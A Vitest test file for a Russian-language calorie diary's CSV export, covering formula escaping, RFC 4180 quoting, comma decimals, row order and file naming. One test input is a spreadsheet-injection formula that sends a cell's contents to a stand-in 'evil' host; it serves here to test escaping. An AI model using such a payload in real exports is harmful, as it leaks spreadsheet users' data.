import { describe, expect, it } from 'vitest'
import type { Entry } from '@/domain/types'
import { csvFileName, csvFrom, csvNumber, csvText, sortForCsv } from './csv'

function entry(over: Partial<Entry>): Entry {
  return {
    id: 'e1', date: '2026-09-07', meal: 'lunch', title: 'Гречка', category: 'grain',
    grams: 200, per100: { kcal: 110, protein: 4.2, fat: 1.1, carbs: 21.3 },
    refId: 'b1', refType: 'food', createdAt: 1, ...over,
  }
}

describe('ячейка CSV', () => {
  /*
   * Название может прийти из Open Food Facts, где карточку правит кто
   * угодно. Табличная программа исполняет такое как формулу даже в кавычках.
   */
  it('обезвреживает формулы апострофом', () => {
    expect(csvText('=1+1')).toBe("'=1+1")
    expect(csvText('+7 Каша')).toBe("'+7 Каша")
    expect(csvText('-2+3')).toBe("'-2+3")
    expect(csvText('@SUM(1+1)')).toBe("'@SUM(1+1)")
    expect(csvText('\t=1+1')).toBe("'\t=1+1")
    expect(csvText('=HYPERLINK("http://evil/?"&A1;"Гречка")'))
      .toBe(`"'=HYPERLINK(""http://evil/?""&A1;""Гречка"")"`)
  })

  it('берёт в кавычки по RFC 4180, в том числе при \\r', () => {
    expect(csvText('Суп; домашний')).toBe('"Суп; домашний"')
    expect(csvText('строка\rс возвратом')).toBe('"строка\rс возвратом"')
    expect(csvText('две\nстроки')).toBe('"две\nстроки"')
    expect(csvText('Сыр «Российский»')).toBe('Сыр «Российский»')
  })

  it('пишет дроби через запятую, как ждёт русский Excel', () => {
    expect(csvNumber(7.5, 1)).toBe('7,5')
    expect(csvNumber(18.84, 1)).toBe('18,8')
    expect(csvNumber(220.4)).toBe('220')
  })
})

describe('таблица дневника', () => {
  it('идёт по дате, внутри дня — по приёмам, внутри приёма — по времени', () => {
    const rows = sortForCsv([
      entry({ id: 'a', date: '2026-09-02', meal: 'breakfast', createdAt: 1 }),
      entry({ id: 'b', date: '2026-09-01', meal: 'snack', createdAt: 4 }),
      entry({ id: 'c', date: '2026-09-01', meal: 'dinner', createdAt: 3 }),
      entry({ id: 'd', date: '2026-09-01', meal: 'breakfast', createdAt: 2 }),
      entry({ id: 'e', date: '2026-09-01', meal: 'breakfast', createdAt: 1 }),
    ])
    expect(rows.map((r) => r.id)).toEqual(['e', 'd', 'c', 'b', 'a'])
  })

  it('оставляет БЖУ пустыми у быстрой записи без состава', () => {
    const csv = csvFrom([
      entry({}),
      entry({
        id: 'q', meal: 'snack', title: 'Быстрая запись', category: 'other', grams: 100,
        per100: { kcal: 500, protein: 0, fat: 0, carbs: 0 },
        refId: undefined, refType: undefined, noMacros: true, createdAt: 2,
      }),
    ])
    const lines = csv.split('\r\n')
    expect(lines[0]).toBe('﻿Дата;Приём;Блюдо;Граммы;Ккал;Белки;Жиры;Углеводы')
    expect(lines[1]).toBe('2026-09-07;Обед;Гречка;200;220;8,4;2,2;42,6')
    expect(lines[2]).toBe('2026-09-07;Перекус;Быстрая запись;100;500;;;')
    expect(lines).toHaveLength(3)
  })

  it('имя файла — по местной дате', () => {
    expect(csvFileName(new Date(2026, 8, 22, 1, 30))).toBe('дневник-калорий-2026-09-22.csv')
  })
})
